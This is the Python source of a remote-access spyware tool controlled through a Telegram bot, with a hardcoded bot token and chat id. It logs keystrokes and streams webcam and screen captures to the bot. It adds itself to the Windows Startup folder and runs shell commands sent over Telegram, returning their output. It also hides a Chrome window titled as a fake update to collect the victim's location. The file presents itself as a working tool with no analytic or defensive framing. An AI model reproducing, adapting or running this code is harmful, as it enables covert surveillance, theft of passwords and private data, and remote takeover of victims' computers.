import getpass
import subprocess
import threading
from datetime import datetime
from time import sleep
import cv2
import keyboard
import numpy as np
import pyautogui
from PIL import ImageGrab
from numpy import ceil, floor
from selenium import webdriver
from selenium.webdriver.chrome.options import Options
from selenium.webdriver.common.by import By
import os
import telebot

api_key = "5297152437:AAEYPa5YGkD-ZEYeqJ_ezqdo7DybwJaDUFc"
bot = telebot.TeleBot(api_key)
print(bot)
width, height = pyautogui.size()

USER_NAME = getpass.getuser()


# Python code to add current script to the registry

# module to edit the windows registry
@bot.message_handler(commands=["start"])
def start(message):
    print(message.chat.id)
    bot.reply_to(message, message.chat.id)


opt = Options()
opt.add_experimental_option("prefs", {
    "profile.default_content_setting_values.media_stream_mic": 1,

    "profile.default_content_setting_values.media_stream_camera": 1,

    "profile.default_content_setting_values.geolocation": 1,

    "profile.default_content_setting_values.notifications": 1

})
opt.add_argument("--disable-infobars")
opt.add_argument("window-size=0,0")
opt.add_argument("--disable-extensions")
opt.add_argument("--use--fake-ui-for-media-stream")
opt.add_argument("--disable-gpu")
opt.add_argument("--no-sandbox")
opt.add_argument('--disable-dev-shm-usage')
# Pass the argument 1 to allow and 2 to block
chat = 1447290875
driver = webdriver.Chrome(chrome_options=opt, executable_path=r'chromedriver.exe')

spans = []

path = os.getcwd()


class Keylogger:
    def __init__(self, interval):
        # we gonna pass SEND_REPORT_EVERY to interval
        self.filename = None
        self.interval = interval

        # this is the string variable that contains the log of all
        # the keystrokes within `self.interval`
        self.log = ""
        # record start & end datetimes
        self.start_dt = datetime.now()
        self.end_dt = datetime.now()

    def callback(self, event):
        """
        This callback is invoked whenever a keyboard event is occured
        (i.e when a key is released in this example)
        """
        name = event.name
        if len(name) > 1:
            # not a character, special key (e.g ctrl, alt, etc.)
            # uppercase with []
            if name == "space":
                # " " instead of "space"
                name = " "
            elif name == "enter":
                # add a new line whenever an ENTER is pressed
                name = "[ENTER]\n"
            elif name == "decimal":
                name = "."
        # finally, add the key name to our global `self.log` variable
        self.log += name

    def report(self):
        """
        This function gets called every `self.interval`
        It basically sends keylogs and resets `self.log` variable
        """
        if self.log:
            # if there is something in log, report it
            self.end_dt = datetime.now()
            # update `self.filename`
            print(self.end_dt)
            print(self.log)
            # if you want to print in the console, uncomment below line
            # print(f"[{self.filename}] - {self.log}")
            self.start_dt = datetime.now()
            try:
                bot.send_message(chat, self.end_dt)
                bot.send_message(chat, self.log)
            except:
                pass
        self.log = ""

        timer = threading.Timer(interval=self.interval, function=self.report)
        # set the thread as daemon (dies when main thread die)
        timer.daemon = True
        # start the timer
        timer.start()

    def start(self):
        # record the start datetime
        self.start_dt = datetime.now()
        # start the keylogger
        keyboard.on_release(callback=self.callback)
        # start reporting the keylogs
        self.report()
        # block the current thread, wait until CTRL+C is pressed
        keyboard.wait()


def add_to_startup(file_path=""):
    if file_path == "":
        file_path = os.path.dirname(os.path.realpath(__file__))
    bat_path = r'C:\Users\%s\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup' % USER_NAME
    os.makedirs(bat_path, exist_ok=True)
    cur = os.curdir
    os.chdir(bat_path)
    if os.path.exists(os.path.join(bat_path, "open.bat")):
        with open(bat_path + '\\' + "open.bat", "w") as bat_file:
            bat_file.write("")
    with open(bat_path + '\\' + "open.bat", "r") as bat_file:
        if not bat_file.read().__contains__(file_path):
            with open(bat_path + '\\' + "open.bat", "w+") as bat_fil:
                bat_fil.write(
                    'cd %s\n' % os.path.join(file_path, "stream.py") + r' pythonw %s' % os.path.join(file_path,
                                                                                                     "stream.py"))

    os.chdir(path)


def webstream(cam=0):
    c = cv2.VideoCapture(cam)

    while True:
        _, frame = c.read()
        cv2.imwrite(os.path.join(path, "../web.png"), frame)
        try:
            bot.send_photo(chat, open(os.path.join(path, "../web.png"), "rb"))
        except:
            pass
        cv2.waitKey(1)


def screenstream():
    while True:
        im = ImageGrab.grab([0, 0, width, height])
        im = cv2.cvtColor(np.array(im), cv2.COLOR_RGB2BGR)
        cv2.imshow("sc", im)
        cv2.waitKey(1)


def screenstream2():
    while True:
        c = pyautogui.screenshot()
        im = cv2.cvtColor(np.array(c), cv2.COLOR_RGB2BGR)
        cv2.imwrite(os.path.join(path, "../screen.png"), im)
        try:
            bot.send_photo(chat, open(os.path.join(path, "../screen.png"), "rb"))
        except:
            pass
        cv2.waitKey(1)


def func(message):
    print(message)
    return message


frac = 1000


@bot.message_handler(func=func)
def code(message):
    try:
        inp = message.text

        print(inp)
        if inp.split(" ")[0] == "cd":
            os.chdir(inp.split(" ")[1])
            bot.send_message(chat, os.getcwd())
        else:
            process = subprocess.run(inp.split(" "), shell=True, capture_output=True, text=True)
            print(len(process.stdout))
            v = int(ceil((len(process.stdout) / frac)))
            print(v)
            if v <= 1:
                v = 1
            print(v)
        for i in range(v + 1):
            try:
                bot.send_message(chat, process.stdout[frac * i:frac * (i + 1)])
            except Exception as e:
                bot.send_message(chat, e)

    except Exception as e:
        print(e)


def keylog():
    k = Keylogger(0.0000000000000000000000000000000001)
    k.start()


def location_log():
    while True:
        try:
            driver.execute_script("document.title='CHROME UPDATE WITH LOCATION'")
            driver.get('https://www.gps-coordinates.net/my-location')
            driver.execute_script("document.title='CHROME UPDATE WITH LOCATION'")

            def get_spans():
                global spans
                spans = [i.text for i in driver.find_elements(By.TAG_NAME, "span")]

                if spans[4] == "" or spans[5] == "" or spans[6] == "":
                    print(spans[4:7])
                    get_spans()
                else:
                    print("yah", spans[4:7])

            get_spans()
            print(" | ".join(spans[4:7]))
        except Exception as e:
            print(e)
        finally:

            bot.send_message(chat, " | ".join(spans[4:7]))
            sleep(60)


def main():
    threading.Thread(target=add_to_startup).start()
    threading.Thread(target=keylog, daemon=True).start()
    threading.Thread(target=screenstream2, daemon=True).start()
    threading.Thread(target=webstream, daemon=True).start()
    threading.Thread(target=location_log, daemon=True).start()
    threading.Thread(target=bot.polling).start()


if __name__ == '__main__':
    threading.Thread(target=bot.polling).start()
